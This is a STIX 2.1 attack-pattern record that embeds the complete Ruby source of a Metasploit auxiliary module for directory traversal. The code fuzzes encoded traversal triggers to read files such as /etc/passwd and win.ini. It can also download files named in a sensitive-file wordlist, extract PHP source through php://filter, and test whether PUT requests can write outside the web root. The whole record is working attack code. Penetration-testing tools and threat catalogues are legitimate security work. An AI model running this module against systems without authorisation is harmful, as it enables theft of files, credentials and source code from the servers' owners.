{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66a9f7fb-484e-4b29-a3af-d7fc772af755",
    "created": "2024-08-14T16:31:12.134264Z",
    "modified": "2024-08-14T16:31:12.134268Z",
    "name": "Generic HTTP Directory Traversal Utility",
    "description": " This module allows you to test if a web server (or web application) is vulnerable to directory traversal with three different actions.  The 'CHECK' action (default) is used to automatically (or manually) find if directory traversal exists in the web server, and then return the path that triggers the vulnerability.  The 'DOWNLOAD' action shares the same ability as 'CHECK', but will take advantage of the found trigger to download files based on a 'FILELIST' of your choosing.  The 'PHPSOURCE' action can be used to download source against PHP applications.  The 'WRITABLE' action can be used to determine if the trigger can be used to write files outside the www directory.  To use the 'COOKIE' option, set your value like so: \"name=value\". ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/http_traversal.rb",
            "external_id": "http_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Thanks to:\n# ipax, neriberto, flambaz, bperry, egypt, and sinn3r for help\n#\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanUniqueQuery\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Generic HTTP Directory Traversal Utility',\n      'Description'    => %q{\n          This module allows you to test if a web server (or web application) is\n        vulnerable to directory traversal with three different actions.\n\n          The 'CHECK' action (default) is used to automatically (or manually) find if\n        directory traversal exists in the web server, and then return the path that\n        triggers the vulnerability.  The 'DOWNLOAD' action shares the same ability as\n        'CHECK', but will take advantage of the found trigger to download files based on\n        a 'FILELIST' of your choosing.  The 'PHPSOURCE' action can be used to download\n        source against PHP applications.  The 'WRITABLE' action can be used to determine\n        if the trigger can be used to write files outside the www directory.\n\n          To use the 'COOKIE' option, set your value like so: \"name=value\".\n      },\n      'Author'         =>\n        [\n          'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>',\n          'Michael Messner <devnull[at]s3cur1ty.de>',\n          'et <et[at]cyberspace.org>',\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'Actions'        =>\n        [\n          ['CHECK',    'Description' => 'Check for basic directory traversal'],\n          ['WRITABLE', 'Description' => 'Check if a traversal bug allows us to write anywhere'],\n          ['DOWNLOAD', 'Description' => 'Attempt to download files after brute forcing a trigger'],\n          ['PHPSOURCE', 'Description' => 'Attempt to retrieve php source code files']\n        ],\n      'DefaultAction'  => 'CHECK'\n    ))\n\n    register_options(\n      [\n        OptEnum.new('METHOD',    [true, 'HTTP Request Method', 'GET', ['GET', 'POST', 'HEAD', 'PUT']]),\n        OptString.new('PATH',    [true, 'Vulnerable path. Ex: /foo/index.php?pg=', '/']),\n        OptString.new('DATA',    [false,'HTTP body data', '']),\n        OptInt.new('DEPTH',      [true, 'Traversal depth', 5]),\n        OptRegexp.new('PATTERN', [true, 'Regexp pattern to determine directory traversal', '^HTTP/\\\\d\\\\.\\\\d 200']),\n        OptPath.new(\n          'FILELIST',\n          [\n            true,\n            'Wordlist file to brute force',\n            File.join(Msf::Config.install_root, 'data', 'wordlists', 'sensitive_files.txt')\n          ])\n      ])\n\n    register_advanced_options(\n      [\n        # We favor automatic\n        OptString.new('TRIGGER',   [false,'Trigger string. Ex: ../', '']),\n        OptString.new('FILE',      [false, 'Default file to read for the fuzzing stage', '']),\n        OptString.new('COOKIE',    [false, 'Cookie value to use when sending the requests', ''])\n      ])\n  end\n\n\n  # Avoids writing to datastore['METHOD'] directly\n  def http_method\n    @http_method || datastore['METHOD']\n  end\n\n  # Avoids writing to datastore['DATA'] directly\n  def data\n    @data || datastore['DATA']\n  end\n\n  #\n  # Constructs an URL from the current context and a provided URI\n  #\n  def build_url(uri)\n    \"http#{datastore['SSL'] ? 's' : ''}://#{rhost}:#{rport}#{uri}\"\n  end\n\n  #\n  # The fuzz() function serves as the engine for the module.  It can intelligently mutate\n  # a trigger, and find potential bugs with it.\n  #\n  def fuzz\n    # Possible triggers\n    triggers =\n      [\n        \"../\", \".../\", \"..\\\\\", \".\\\\..\\\\\", \"..///\", \".\\\\./\", \".//..//\",\n        \".%2e./\", \"%2e%2e/\", \"..%5c\", \"..%2f\",\"..%c0%af..\"\n      ]\n\n    # Initialize the default file(s) we should try to read during fuzzing\n    if datastore['FILE'].empty?\n      file_to_read = ['etc/passwd', 'boot.ini', 'windows\\\\win.ini']\n    else\n      file_to_read = [datastore['FILE']]\n    end\n\n    # Each possible trigger, we try to traverse multiple levels down depending\n    # on datastore['DEPATH']\n    depth = datastore['DEPTH']\n    triggers.each do |base|\n      1.upto(depth) do |d|\n        file_to_read.each do |f|\n          trigger = base * d\n          p = normalize_uri(datastore['PATH']) + trigger + f\n          req = ini_request(p)\n          vprint_status(\"Trying: #{build_url(p)}\")\n          res = send_request_cgi(req, 25)\n          return trigger if res and res.to_s =~ datastore['PATTERN']\n        end\n      end\n    end\n\n    return nil\n  end\n\n  #\n  # This method will build the HTTP request based on what the user gives us\n  #\n  def ini_request(uri)\n    req = {}\n\n    case http_method\n    when 'GET'\n      # Example: Say we have the following datastore['PATH']\n      # '/test.php?page=1&id=3&note=whatever'\n      # We expect it to regex the GET parameters:\n      # 'page=1&id=3&note=whatever'\n      # And then let queryparse() to handle the rest\n      query_params = uri.match(/\\?(\\w+=.+&*)$/)\n      req['vars_get'] = queryparse(query_params[1]) if query_params\n    when 'POST'\n      req['vars_post'] = queryparse(data) if not data.empty?\n    when 'PUT'\n      req['data'] = data if not data.empty?\n    when 'HEAD'\n    end\n\n    if not req['vars_get'].nil? or not req['vars_post'].nil? or not req['data'].nil?\n      begin\n        this_path = URI(uri).path\n      rescue ::URI::InvalidURIError\n        this_path = uri.scan(/^(.+)\\?*.*/).flatten[0]\n      end\n    else\n      this_path = uri\n    end\n\n    req['method']     = http_method\n    req['uri']        = this_path\n    req['headers']    = {'Cookie'=>datastore['COOKIE']} if not datastore['COOKIE'].empty?\n    req['data']       = data if not data.empty?\n    req['authorization'] = basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n\n    return req\n  end\n\n  #\n  # Determine if we should automatically fuzz a trigger, or use the user-supplied one\n  #\n  def ini_trigger\n    return datastore['TRIGGER'] if not datastore['TRIGGER'].empty?\n\n    trigger = fuzz\n    if trigger.nil?\n      print_error(\"No trigger found\")\n    else\n      print_good(\"Found trigger: #{trigger}\")\n    end\n\n    return trigger\n  end\n\n  #\n  # Action 'CHECK': Find the trigger either automatically using fuzz(), or manually by\n  # setting the TRIGGER and FILE option\n  #\n  def check(trigger)\n    if datastore['TRIGGER'].empty?\n      # Found trigger using fuzz()\n      found = true if trigger\n      uri = normalize_uri(datastore['PATH']) + trigger\n    else\n      # Manual check. meh.\n      if datastore['FILE'].empty?\n        print_error(\"Must specify a 'FILE' to check manually\")\n        return\n      end\n\n      uri = normalize_uri(datastore['PATH']) + trigger + datastore['FILE']\n      req = ini_request(uri)\n      vprint_status(\"Trying: #{build_url(uri)}\")\n      res = send_request_cgi(req, 25)\n      found = true if res and res.to_s =~ datastore['PATTERN']\n    end\n\n    # Reporting\n    if found\n      print_good(\"Directory traversal found: #{trigger}\")\n\n      report_web_vuln({\n        :host     => rhost,\n        :port     => rport,\n        :vhost    => datastore['VHOST'],\n        :path     => uri,\n        :params   => normalize_uri(datastore['PATH']),\n        :pname    => trigger,\n        :risk     => 3,\n        :proof    => trigger,\n        :name     => self.fullname,\n        :category => \"web\",\n        :method   => http_method\n      })\n\n    else\n      print_error(\"No directory traversal detected\")\n    end\n  end\n\n  #\n  # Action 'DOWNLOAD': Used to download a file with a directory traversal\n  #\n  def lfi_download(trigger, files)\n    counter = 0\n    files.each_line do |f|\n      # Our trigger already puts us in '/', so our filename doesn't need to begin with that\n      f = f[1,f.length] if f =~ /^\\//\n\n      req = ini_request(uri = (normalize_uri(datastore['PATH']) + trigger + f).chop)\n      res = send_request_cgi(req, 25)\n\n      next if not res or res.body.empty?\n\n      vprint_status(\"#{res.code.to_s} for #{build_url(uri)}\")\n\n      # Only download files that are within our interest\n      if res.to_s =~ datastore['PATTERN']\n        # We assume the string followed by the last '/' is our file name\n        fname = f.split(\"/\")[-1].chop\n        loot = store_loot(\"lfi.data\",\"text/plain\",rhost, res.body,fname)\n        print_good(\"File #{fname} downloaded to: #{loot}\")\n        counter += 1\n      end\n    end\n    print_status(\"#{counter.to_s} file(s) downloaded\")\n  end\n\n\n  #\n  # Action 'PHPSOURCE': Used to grab the php source code\n  #\n  def php_download(files)\n    counter = 0\n    files.each_line do |f|\n      # Our trigger already puts us in '/', so our filename doesn't need to begin with that\n      f = f[1,f.length] if f =~ /^\\//\n\n      req = ini_request(uri = (normalize_uri(datastore['PATH']) + \"php://filter/read=convert.base64-encode/resource=\" + f).chop)\n      res = send_request_cgi(req, 25)\n\n      next if not res or res.body.empty?\n\n      vprint_status(\"#{res.code.to_s} for #{build_url(uri)}\")\n\n      # We assume the string followed by the last '/' is our file name\n      fname = f.split(\"/\")[-1].chop\n      loot = store_loot(\"php.data\",\"text/plain\",rhost,Rex::Text.decode_base64(res.body),fname)\n      print_good(\"File #{fname} downloaded to: #{loot}\")\n      counter += 1\n    end\n    print_status(\"#{counter.to_s} source code file(s) downloaded\")\n  end\n\n\n  #\n  # Action 'WRITABLE': This method will attempt to write to a directory outside of www\n  #\n  def is_writable(trigger)\n    # Modify some registered options for the PUT method\n    tmp_method = http_method\n    tmp_data   = data\n    @http_method = 'PUT'\n\n    if data.empty?\n      unique_str = Rex::Text.rand_text_alpha(4) * 4\n      @data = unique_str\n    else\n      unique_str = data\n    end\n\n    # Form the PUT request\n    fname = Rex::Text.rand_text_alpha(rand(5) + 5) + '.txt'\n    uri = normalize_uri(datastore['PATH']) + trigger + fname\n    vprint_status(\"Attempt to upload to: #{build_url(uri)}\")\n    req = ini_request(uri)\n\n    # Upload our unique string, don't care much about the response\n    send_request_cgi(req, 25)\n\n    # Prepare request to read our file\n    @http_method = 'GET'\n    @data   = tmp_data\n    req = ini_request(uri)\n    vprint_status(\"Verifying upload...\")\n    res = send_request_cgi(req, 25)\n\n    # Did we get it?\n    if res and res.body =~ /#{unique_str}/\n      print_good(\"WRITE is possible on #{rhost}:#{rport}\")\n    else\n      print_error(\"WRITE seems unlikely\")\n    end\n\n    # Ah, don't forget to restore our method\n    @http_method = tmp_method\n  end\n\n  #\n  # Load the whole file list\n  # This is used in the lfi_download() function\n  #\n  def load_filelist\n    File.open(datastore['FILELIST'], 'rb') {|f| f.read}\n  end\n\n  def run_host(ip)\n    # Warn if it's not a well-formed UPPERCASE method\n    if http_method !~ /^[A-Z]+$/\n      print_warning(\"HTTP method #{http_method} is not Apache-compliant. Try only UPPERCASE letters.\")\n    end\n    print_status(\"Running action: #{action.name}...\")\n\n    # And it's..... \"SHOW TIME!!\"\n    if action.name == 'CHECK'\n      trigger = ini_trigger\n      return if trigger.nil?\n      check(trigger)\n\n    elsif action.name == 'WRITABLE'\n      trigger = ini_trigger\n      return if trigger.nil?\n      is_writable(trigger)\n\n    elsif action.name == 'PHPSOURCE'\n      trigger = ini_trigger\n      return if trigger.nil?\n      files = load_filelist\n      php_download(files)\n\n    elsif action.name == 'DOWNLOAD'\n      trigger = ini_trigger\n      return if trigger.nil?\n\n      # Load up a file list that we wish to download, and then attempt to download them\n      # with our directory traversal trigger\n      files = load_filelist\n      lfi_download(trigger, files)\n    end\n  end\nend\n"
}